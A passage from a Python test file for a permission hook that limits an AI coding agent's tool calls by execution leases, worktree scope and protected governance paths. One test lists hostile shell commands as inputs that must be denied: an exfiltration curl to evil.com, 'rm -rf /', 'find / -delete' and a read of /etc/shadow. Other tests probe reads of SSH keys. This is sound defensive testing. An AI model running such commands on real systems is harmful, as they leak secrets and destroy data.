            {"tool_name": None, "tool_input": {}},
        ):
            p = run_hook_subproc(payload, env={"UME_HARNESS_STATE_DIR": td})
            check(f"{payload!r} exits 2", p.returncode == 2, f"got {p.returncode}")
            check(
                f"{payload!r} reports INVALID_HOOK_INPUT",
                "INVALID_HOOK_INPUT" in p.stderr,
                f"stderr={p.stderr!r}",
            )


def test_malformed_tool_paths_fail_closed_without_traceback() -> None:
    print("\n[fail-closed] malformed tool paths -> canonical exit 2 denial")
    cases = (
        ("Read", "file_path"),
        ("Glob", "path"),
        ("Grep", "path"),
        ("Edit", "file_path"),
        ("Write", "file_path"),
        ("NotebookEdit", "notebook_path"),
    )
    with tempfile.TemporaryDirectory() as td:
        for tool_name, path_key in cases:
            proc = run_hook_subproc(
                {"tool_name": tool_name, "tool_input": {path_key: 123}},
                env={"UME_HARNESS_STATE_DIR": td},
            )
            check(f"{tool_name} malformed path -> exit 2", proc.returncode == 2, f"got {proc.returncode}")
            check(
                f"{tool_name} malformed path reports INVALID_TARGET_PATH",
                "INVALID_TARGET_PATH" in proc.stderr,
                f"stderr={proc.stderr!r}",
            )
            check(f"{tool_name} malformed path has no traceback", "Traceback" not in proc.stderr)

        malformed_search_cases = (
            ("Glob", {"path": td, "pattern": 123}),
            ("Glob", {"path": td}),
            ("Grep", {"path": td, "pattern": 123}),
            ("Grep", {"path": td, "pattern": "needle", "glob": 123}),
        )
        for tool_name, tool_input in malformed_search_cases:
            proc = run_hook_subproc(
                {"tool_name": tool_name, "tool_input": tool_input},
                env={"UME_HARNESS_STATE_DIR": td},
            )
            check(f"{tool_name} malformed search input -> exit 2", proc.returncode == 2, f"got {proc.returncode}")
            check(
                f"{tool_name} malformed search input reports INVALID_TARGET_PATH",
                "INVALID_TARGET_PATH" in proc.stderr,
                f"stderr={proc.stderr!r}",
            )

        nul_cases = (
            ("Read", {"file_path": "bad\x00path"}),
            ("NotebookEdit", {"filePath": "bad\x00notebook"}),
            ("Glob", {"path": td, "pattern": "bad\x00pattern"}),
            ("Grep", {"path": td, "glob": "bad\x00glob", "pattern": "needle"}),
            ("Bash", {"command": "cat bad\x00path"}),
        )
        for tool_name, tool_input in nul_cases:
            proc = run_hook_subproc(
                {"tool_name": tool_name, "tool_input": tool_input},
                env={"UME_HARNESS_STATE_DIR": td},
            )
            check(f"{tool_name} NUL input -> exit 2", proc.returncode == 2, f"got {proc.returncode}")
            check(
                f"{tool_name} NUL input reports INVALID_TARGET_PATH",
                "INVALID_TARGET_PATH" in proc.stderr,
                f"stderr={proc.stderr!r}",
            )
            check(f"{tool_name} NUL input has no traceback", "Traceback" not in proc.stderr)


def test_empty_stdin_denied_fail_closed() -> None:
    print("\n[edge case] 空stdin -> exit 2 + fail-closed reason")
    p = subprocess.run([sys.executable, _HOOK_PATH], input="", capture_output=True, text=True)
    check("empty stdin exits 2", p.returncode == 2, f"got {p.returncode}")
    check("empty stdin explains fail-closed input rejection", "INVALID_HOOK_INPUT" in p.stderr, f"stderr={p.stderr!r}")


def test_activation_state_without_runtime_digest_fails_closed() -> None:
    print("\n[Activation Integrity] active state without runtime digest -> exit 2")
    with tempfile.TemporaryDirectory() as td:
        activation_path = os.path.join(td, "activation.json")
        with open(activation_path, "w", encoding="utf-8") as activation:
            json.dump(
                {
                    "schema": "local-execution-lease-activation.v0",
                    "mode": "active",
                },
                activation,
            )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Read", "tool_input": {"file_path": "/tmp/ordinary.txt"}},
            gate=leg.create_default_gate(
                state_path=os.path.join(td, "leases.json"),
                domain_resolver=lambda _: None,
            ),
            state_dir=td,
        )
        check("active activation without digest exits 2", code == 2, f"got {code}")
        check(
            "missing activation digest reports activation error",
            err is not None and "ACTIVATION_ERROR" in err,
            f"err={err!r}",
        )


# --- 2. Lease Gate 連携テスト (Phase 3A) ---
def test_lease_gate_managed_domain_with_active_lease_allowed() -> None:
    print("\n[Lease Gate] Lease 管理ドメイン内の Edit + 有効な active Lease -> exit 0")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            task_id="t1",
            task_contract_sha256="1" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        policy = PolicyReference(
            policy_id="p1",
            policy_sha256="2" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        context = RuntimeContext(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            branch="task/b1",
            starting_head="3" * 40,
            baseline_status_digest="4" * 64,
            baseline_tree_digest="5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "code.py")}},
            gate=gate,
            state_dir=td,
        )
        check("exit 0 (ALLOW)", code == 0, f"got code={code}")
        check("err is None", err is None, f"got err={err!r}")


def test_test_only_lease_does_not_invent_host_command_authority() -> None:
    print("\n[Test Capability Boundary] Persisted test profile is not an executable command mapping")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        os.makedirs(worktree)
        store = LeaseStateStore(
            state_path=os.path.join(td, "leases.json"),
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            "test-only",
            "1" * 64,
            frozenset({"test"}),
            test_profile="pytest",
        )
        policy = PolicyReference(
            "p1",
            "2" * 64,
            frozenset({"edit", "test"}),
            approved_test_profiles=frozenset({"pytest"}),
        )
        context = RuntimeContext("repo1", worktree, "task/test", "3" * 40, "4" * 64, "5" * 64)
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        domain = leg.ManagedExecutionDomain("repo1", worktree, "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Bash", "tool_input": {"command": "pytest -q"}, "cwd": worktree},
            gate=gate,
            state_dir=td,
        )
        check("test-only Lease does not authorize arbitrary Bash", code == 2, f"got {code}")
        check("unwired test command remains approval-required", err is not None and "承認が必要" in err)


def test_active_lease_cannot_override_constitution_or_execution_gate_tiers() -> None:
    print("\n[Path Tier] Active edit Lease cannot override constitution/governance gates")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        store = LeaseStateStore(
            state_path=os.path.join(td, "leases.json"),
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("t1", "1" * 64, frozenset({"edit"}))
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit"}))
        context = RuntimeContext(
            "repo1",
            os.path.realpath(worktree),
            "task/b1",
            "3" * 40,
            "4" * 64,
            "5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        domain = leg.ManagedExecutionDomain(
            "repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        ci_governance_paths = (
            ".gitlab-ci.yml",
            "azure-pipelines.yml",
            "azure-pipelines.yaml",
            ".circleci/config.yml",
            ".github/workflows/check.yml",
            "Jenkinsfile",
        )
        for rel in ci_governance_paths:
            target = os.path.join(worktree, rel)
            tier = hook.runner.resolve_path_tier(target, worktree, worktree)
            check(
                f"CI control {rel} uses governance tier",
                tier.value == "TIER_GOVERNANCE",
                f"got {tier.value}",
            )
            code, err = hook.evaluate_invocation(
                {
                    "tool_name": "Edit",
                    "tool_input": {"file_path": target},
                    "cwd": worktree,
                },
                gate=gate,
                state_dir=td,
            )
            check(
                f"CI control {rel} edit still requires approval",
                code == 2 and err is not None and "TIER_GOVERNANCE" in err,
                f"got code={code}, err={err!r}",
            )

        runtime_yaml = os.path.join(worktree, "src", "config.yml")
        runtime_yaml_tier = hook.runner.resolve_path_tier(runtime_yaml, worktree, worktree)
        check(
            "ordinary runtime YAML keeps runtime tier",
            runtime_yaml_tier.value == "TIER_RUNTIME_CODE",
            f"got {runtime_yaml_tier.value}",
        )
        runtime_yaml_code, runtime_yaml_err = hook.evaluate_invocation(
            {
                "tool_name": "Edit",
                "tool_input": {"file_path": runtime_yaml},
                "cwd": worktree,
            },
            gate=gate,
            state_dir=td,
        )
        check(
            "ordinary runtime YAML remains allowed by active edit Lease",
            runtime_yaml_code == 0 and runtime_yaml_err is None,
            f"got code={runtime_yaml_code}, err={runtime_yaml_err!r}",
        )

        protected_paths = (
            "AGENTS.md",
            "AGENTS.override.md",
            "config.toml",
            "settings.json",
            "contracts/new_policy.md",
            "scripts/release.sh",
            "automation/release.py",
            "ci/build.sh",
            "hooks/pre-commit",
            ".git/config",
            ".git/config.worktree",
            ".git/HEAD",
            ".git/index",
            ".git/refs/heads/main",
            ".git/hooks/pre-commit",
            ".claude/settings.json",
            ".claude/settings.local.json",
            ".claude/commands/unsafe.md",
        )
        for rel in protected_paths:
            code, err = hook.evaluate_invocation(
                {
                    "tool_name": "Edit",
                    "tool_input": {"file_path": os.path.join(worktree, rel)},
                    "cwd": worktree,
                },
                gate=gate,
                state_dir=td,
            )

            check(f"protected {rel} edit -> exit 2", code == 2, f"got {code}")
            check(f"protected {rel} deny has reason", err is not None, f"got err={err!r}")

        code, err = hook.evaluate_invocation(
            {
                "tool_name": "NotebookEdit",
                "tool_input": {"filePath": os.path.join(worktree, ".env")},
                "cwd": worktree,
            },
            gate=gate,
            state_dir=td,
        )
        check("NotebookEdit filePath secret -> exit 2", code == 2, f"got {code}")
        check("NotebookEdit filePath secret has deny reason", err is not None, f"got err={err!r}")


def test_multiple_active_leases_select_invocation_worktree() -> None:
    print("\n[Lease Selection] Multiple active worktrees use the invocation-bound Lease")
    with tempfile.TemporaryDirectory() as td:
        worktrees = {
            name: os.path.realpath(os.path.join(td, name))
            for name in ("worktree-a", "worktree-b")
        }
        for worktree in worktrees.values():
            os.makedirs(os.path.join(worktree, "scripts"))

        store = LeaseStateStore(
            state_path=os.path.join(td, "leases.json"),
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        domains = {}
        for index, (name, worktree) in enumerate(worktrees.items(), 1):
            repository = f"repo-{index}"
            task = CanonicalTaskReference(f"task-{index}", str(index) * 64, frozenset({"edit"}))
            policy = PolicyReference("p1", "f" * 64, frozenset({"edit"}))
            context = RuntimeContext(
                repository,
                worktree,
                f"task/{name}",
                str(index + 2) * 40,
                str(index + 3) * 64,
                str(index + 4) * 64,
            )
            lease = derive_lease(task, policy, context)
            store.issue(lease)
            store.activate(lease.lease_id)
            domains[name] = leg.ManagedExecutionDomain(
                repository, worktree, "lease", "p1", "f" * 64
            )

        def resolve_domain(path):
            for name, worktree in worktrees.items():
                if leg._is_path_inside(path, worktree):
                    return domains[name]
            return None

        gate = leg.LocalExecutionGate(store, resolve_domain, lambda _p, _path, _a: True)
        worktree_b = worktrees["worktree-b"]
        read_code, read_err = hook.evaluate_invocation(
            {
                "tool_name": "Read",
                "tool_input": {"file_path": os.path.join(worktree_b, "notes.txt")},
                "cwd": worktree_b,
            },
            gate=gate,
            state_dir=td,
        )
        check("read in second active worktree -> exit 0", read_code == 0, f"err={read_err!r}")

        governance_code, governance_err = hook.evaluate_invocation(
            {
                "tool_name": "Edit",
                "tool_input": {"file_path": os.path.join(worktree_b, "scripts", "release.py")},
                "cwd": worktree_b,
            },
            gate=gate,
            state_dir=td,
        )
        check("second worktree root scripts remain governance -> exit 2", governance_code == 2)
        check(
            "second worktree governance denial is reported",
            governance_err is not None and "TIER_GOVERNANCE" in governance_err,
            f"err={governance_err!r}",
        )

        worktree_a = worktrees["worktree-a"]
        for tool_name in ("Read", "Edit"):
            conflict_code, conflict_err = hook.evaluate_invocation(
                {
                    "tool_name": tool_name,
                    "tool_input": {
                        "file_path": os.path.join(worktree_b, "notes.txt")
                    },
                    "cwd": worktree_a,
                },
                gate=gate,
                state_dir=td,
            )
            check(
                f"{tool_name} cannot borrow a different worktree Lease -> exit 2",
                conflict_code == 2,
                f"got {conflict_code}",
            )
            check(
                f"{tool_name} cross-worktree Lease conflict is reported",
                conflict_err is not None and "STATE_STORE_ERROR" in conflict_err,
                f"err={conflict_err!r}",
            )


def test_notebook_edit_rejects_conflicting_target_aliases() -> None:
    print("\n[NotebookEdit] Conflicting target aliases fail closed")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        outside = os.path.realpath(os.path.join(td, "outside"))
        os.makedirs(worktree)
        os.makedirs(outside)

        store = LeaseStateStore(
            state_path=os.path.join(td, "leases.json"),
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("task-notebook", "1" * 64, frozenset({"edit"}))
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit"}))
        context = RuntimeContext(
            "repo",
            worktree,
            "task/notebook",
            "3" * 40,
            "4" * 64,
            "5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        domain = leg.ManagedExecutionDomain("repo", worktree, "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(
            store,
            lambda path: domain if leg._is_path_inside(path, worktree) else None,
            lambda _p, _path, _a: True,
        )

        conflict_code, conflict_err = hook.evaluate_invocation(
            {
                "tool_name": "NotebookEdit",
                "tool_input": {
                    "notebook_path": os.path.join(outside, "outside.ipynb"),
                    "file_path": os.path.join(worktree, "inside.ipynb"),
                },
                "cwd": worktree,
            },
            gate=gate,
            state_dir=td,
        )
        check("conflicting NotebookEdit aliases -> exit 2", conflict_code == 2)
        check(
            "conflicting NotebookEdit aliases report invalid target",
            conflict_err is not None and "INVALID_TARGET_PATH" in conflict_err,
            f"err={conflict_err!r}",
        )

        equivalent_code, equivalent_err = hook.evaluate_invocation(
            {
                "tool_name": "NotebookEdit",
                "tool_input": {
                    "notebook_path": "inside.ipynb",
                    "filePath": os.path.join(worktree, "inside.ipynb"),
                },
                "cwd": worktree,
            },
            gate=gate,
            state_dir=td,
        )
        check(
            "equivalent NotebookEdit aliases remain allowed",
            equivalent_code == 0,
            f"got {equivalent_code} err={equivalent_err!r}",
        )


def test_read_rejects_conflicting_target_aliases() -> None:
    print("\n[Read] Conflicting target aliases fail closed")
    with tempfile.TemporaryDirectory() as td:
        ordinary = os.path.join(td, "ordinary.txt")
        secret = os.path.join(td, ".env")
        with open(ordinary, "w", encoding="utf-8") as out:
            out.write("ordinary")
        with open(secret, "w", encoding="utf-8") as out:
            out.write("TOKEN=test-only")

        conflict_code, conflict_err = hook.evaluate_invocation(
            {
                "tool_name": "Read",
                "tool_input": {"file_path": ordinary, "filePath": secret},
                "cwd": td,
            },
            gate=leg.create_default_gate(
                state_path=os.path.join(td, "leases.json"),
                domain_resolver=lambda _: None,
            ),
            state_dir=td,
        )
        check("conflicting Read aliases -> exit 2", conflict_code == 2)
        check(
            "conflicting Read aliases report invalid target",
            conflict_err is not None and "INVALID_TARGET_PATH" in conflict_err,
            f"err={conflict_err!r}",
        )


def test_lease_gate_managed_domain_without_lease_fails_closed() -> None:
    print("\n[Lease Gate] Lease 管理ドメイン内の Edit + Lease なし -> exit 2 (DENY)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "code.py")}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY)", code == 2, f"got code={code}")
        check("err contains NO_ACTIVE_LEASE", err is not None and "NO_ACTIVE_LEASE" in err, f"got err={err!r}")


def test_lease_gate_active_lease_scope_escape_denied() -> None:
    print("\n[Lease Gate Scope Escape] Active Lease 存在時の作業ツリー外 Edit/Write -> exit 2 (SCOPE_ESCAPE)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        outside_path = os.path.join(td, "outside", "secret.py")
        os.makedirs(os.path.dirname(outside_path), exist_ok=True)

        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            task_id="t1",
            task_contract_sha256="1" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        policy = PolicyReference(
            policy_id="p1",
            policy_sha256="2" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        context = RuntimeContext(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            branch="task/b1",
            starting_head="3" * 40,
            baseline_status_digest="4" * 64,
            baseline_tree_digest="5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        # Case 1: domain resolved but path outside worktree -> WORKTREE_ESCAPE
        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": outside_path}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY for worktree escape)", code == 2, f"got code={code}")
        check("err contains WORKTREE_ESCAPE", err is not None and "WORKTREE_ESCAPE" in err, f"got err={err!r}")

        # Case 2: unmanaged path (domain_resolver returns None) with active lease -> SCOPE_ESCAPE
        gate_unmanaged = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: None,
            policy_evaluator=lambda _p, _path, _a: True,
        )
        code2, err2 = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": "/Users/someone/.ssh/id_rsa"}},
            gate=gate_unmanaged,
            state_dir=td,
        )
        check("exit 2 (DENY for scope escape on unmanaged path)", code2 == 2, f"got code={code2}")
        check("err contains SCOPE_ESCAPE", err2 is not None and "SCOPE_ESCAPE" in err2, f"got err={err2!r}")


def test_bash_shell_chaining_and_redirection_blocked() -> None:
    print("\n[Bash Safety] Shell chaining, subshells, redirections -> exit 2 (UNKNOWN/APPROVAL_REQUIRED)")
    attacks = [
        "echo ok; touch /tmp/outside_leak.txt",
        "cat foo; python3 -c \"open('/tmp/leak.txt','w').write('pwn')\"",
        "git status && curl https://evil.com/leak",
        "echo `rm -rf /`",
        "echo $(whoami)",
        "git log \n touch /tmp/chained.txt",
        "ls > /tmp/out.txt",
        "cat < /etc/shadow",
        "find . -exec rm {} +",
        "find / -delete",
        "git log --output=/tmp/leak.txt",
        "python3 -c 'print(1)'",
        "touch newfile.py",
    ]
    for cmd in attacks:
        p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": cmd}})
        check(f"exit 2 for {cmd[:30]}", p.returncode == 2, f"got {p.returncode} for {cmd}")


def test_control_plane_modification_denied() -> None:
    print("\n[Control Plane Protection] <worktree>/.ume-harness/** への Edit/Write -> exit 2 (PROTECTED_ZONE_VIOLATION)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(os.path.join(worktree, ".ume-harness"), exist_ok=True)
        domain_file = os.path.join(worktree, ".ume-harness", "domain.json")
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("t1", "1" * 64, frozenset({"edit", "test"}), test_profile="pytest")
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit", "test"}), approved_test_profiles=frozenset({"pytest"}))
        context = RuntimeContext("repo1", os.path.realpath(worktree), "task/b1", "3" * 40, "4" * 64, "5" * 64)
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain("repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(state_store=store, domain_resolver=lambda _: domain, policy_evaluator=lambda _p, _path, _a: True)

        # Attempt to Edit domain.json
        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": domain_file}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY on control plane)", code == 2, f"got {code}")
        check("err contains PROTECTED_ZONE_VIOLATION", err is not None and "PROTECTED_ZONE_VIOLATION" in err, f"got err={err!r}")


def test_active_lease_read_scope_escape_denied() -> None:
    print("\n[Read Scope Escape] Active Lease 下の作業ツリー外 Read / cat / head / grep -> exit 2 (SCOPE_ESCAPE)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(os.path.join(worktree, "src"), exist_ok=True)
        with open(os.path.join(worktree, "src", "code.py"), "w") as f:
            f.write("print('hello')")

        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("t1", "1" * 64, frozenset({"edit", "test"}), test_profile="pytest")
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit", "test"}), approved_test_profiles=frozenset({"pytest"}))
        context = RuntimeContext("repo1", os.path.realpath(worktree), "task/b1", "3" * 40, "4" * 64, "5" * 64)
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain("repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(state_store=store, domain_resolver=lambda _: domain, policy_evaluator=lambda _p, _path, _a: True)

        # 1. Read inside worktree -> ALLOW
        c1, _ = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": os.path.join(worktree, "src", "code.py")}}, gate=gate, state_dir=td)
        check("Read inside worktree -> exit 0", c1 == 0, f"got {c1}")

        # 2. Read outside worktree -> DENY
        c2, e2 = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": "/Users/someone/.ssh/id_rsa"}}, gate=gate, state_dir=td)
        check("Read outside worktree -> exit 2", c2 == 2, f"got {c2}")
        check("err contains SCOPE_ESCAPE", e2 is not None and "SCOPE_ESCAPE" in e2, f"got err={e2!r}")

        # 3. Bash cat outside worktree -> DENY
        c3, e3 = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "cat /Users/someone/.ssh/id_rsa"}}, gate=gate, state_dir=td)
        check("Bash cat outside worktree -> exit 2", c3 == 2, f"got {c3}")
        check("err contains SCOPE_ESCAPE", e3 is not None and "SCOPE_ESCAPE" in e3, f"got err={e3!r}")

        # 4. Bash head outside worktree -> DENY
        c4, e4 = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "head -n 5 /etc/passwd"}}, gate=gate, state_dir=td)
        check("Bash head outside worktree -> exit 2", c4 == 2, f"got {c4}")
        check("err contains SCOPE_ESCAPE", e4 is not None and "SCOPE_ESCAPE" in e4, f"got err={e4!r}")

        # 5. Bash cat inside worktree -> ALLOW
        c5, _ = hook.evaluate_invocation(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "cat src/code.py"},
                "cwd": worktree,
            },
            gate=gate,
            state_dir=td,
        )
        check("Bash cat inside worktree -> exit 0", c5 == 0, f"got {c5}")

        # 6. A filename after `--` remains a scoped operand even if it begins with '-'.
        outside_dash_name = os.path.join(td, "-outside-note")
        with open(outside_dash_name, "w", encoding="utf-8") as outside_out:
            outside_out.write("outside")
        c6, e6 = hook.evaluate_invocation(
            {"tool_name": "Bash", "tool_input": {"command": "cat -- -outside-note"}, "cwd": td},
            gate=gate,
            state_dir=td,
        )
        check("Bash option-terminated outside operand -> exit 2", c6 == 2, f"got {c6}")
        check("option-terminated operand reports SCOPE_ESCAPE", e6 is not None and "SCOPE_ESCAPE" in e6)

        # 7. Path-less Glob/Grep use their invocation cwd and cannot escape.
        for tool_name in ("Glob", "Grep"):
            tool_input = {"pattern": "*" if tool_name == "Glob" else "needle"}
            code, err = hook.evaluate_invocation(
                {"tool_name": tool_name, "tool_input": tool_input, "cwd": td},
                gate=gate,
                state_dir=td,
            )
            check(f"path-less {tool_name} outside worktree -> exit 2", code == 2, f"got {code}")
            check(f"path-less {tool_name} reports SCOPE_ESCAPE", err is not None and "SCOPE_ESCAPE" in err)


def test_active_lease_missing_cwd_uses_process_cwd_for_relative_reads() -> None:
    print("\n[Path Tier] Missing hook cwd must resolve relative reads from the hook process cwd")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        process_cwd = os.path.realpath(os.path.join(td, "process-cwd"))
        os.makedirs(worktree)
        os.makedirs(process_cwd)
        for directory in (worktree, process_cwd):
            with open(os.path.join(directory, "notes.txt"), "w", encoding="utf-8") as notes_out:
                notes_out.write("ordinary note")

        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("read-task", "1" * 64, frozenset({"edit"}))
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit"}))
        context = RuntimeContext(
            "repo1", worktree, "task/read", "3" * 40, "4" * 64, "5" * 64
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        domain = leg.ManagedExecutionDomain("repo1", worktree, "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        previous_cwd = os.getcwd()
        try:
            os.chdir(process_cwd)
            code, err = hook.evaluate_invocation(
                {"tool_name": "Read", "tool_input": {"file_path": "notes.txt"}},
                gate=gate,
                state_dir=td,
            )
            check("missing cwd outside worktree -> exit 2", code == 2, f"got {code}")
            check("missing cwd outside worktree reports SCOPE_ESCAPE", err is not None and "SCOPE_ESCAPE" in err)

            os.chdir(worktree)
            code, err = hook.evaluate_invocation(
                {"tool_name": "Read", "tool_input": {"file_path": "notes.txt"}},
                gate=gate,
                state_dir=td,
            )
            check("missing cwd inside worktree -> exit 0", code == 0, f"got {code} err={err!r}")
        finally:
            os.chdir(previous_cwd)


def test_unmanaged_read_scope_allowed() -> None:
    print("\n[Unmanaged Read Scope] Lease なし環境での Read / cat -> exit 0 (通常利用維持)")
    with tempfile.TemporaryDirectory() as td:
        gate_nolease = leg.create_default_gate(
            state_path=os.path.join(td, "leases.json"),
            domain_resolver=lambda _: None,
        )
        c1, _ = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": "/tmp/test.txt"}}, gate=gate_nolease, state_dir=td)
        check("Unmanaged Read -> exit 0", c1 == 0, f"got {c1}")
        c2, _ = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "cat /tmp/test.txt"}}, gate=gate_nolease, state_dir=td)
        check("Unmanaged cat -> exit 0", c2 == 0, f"got {c2}")


def test_corrupt_lease_state_denies_scope_sensitive_reads() -> None:
    print("\n[State Error] Corrupt Lease state must deny scope-sensitive reads")
    with tempfile.TemporaryDirectory() as td:
        state_file = os.path.join(td, "leases.json")
        with open(state_file, "w", encoding="utf-8") as state_out:
            state_out.write("{not-json")
        gate = leg.create_default_gate(state_path=state_file, domain_resolver=lambda _: None)
        cases = [
            {"tool_name": "Read", "tool_input": {"file_path": "/tmp/normal.txt"}},
            {"tool_name": "Glob", "tool_input": {"path": "/tmp", "pattern": "*"}},
            {"tool_name": "Grep", "tool_input": {"path": "/tmp", "pattern": "needle"}},
